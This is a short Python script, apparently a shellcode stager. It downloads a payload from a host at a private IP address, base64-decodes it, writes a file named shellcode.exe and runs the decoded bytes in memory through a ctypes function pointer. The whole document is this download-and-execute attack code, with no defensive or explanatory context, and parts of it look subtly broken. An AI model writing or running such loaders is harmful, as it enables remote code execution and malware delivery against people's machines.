import requests
import ctypes
import base64

url = "http://192.168.29.130:8000/shellcode.bin"
response = requests.get(url,stream=True)

shellcode = base64.b64decode(response.content)
with open("shellcode.exe","wb") as f:
    for chunk in response.iter_content(chunk_size=100):
        if chunk:
            f.write(chunk)

shellcode_buffer = ctypes.create_string_buffer(shellcode,len(shellcode))
shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

shellcode_func()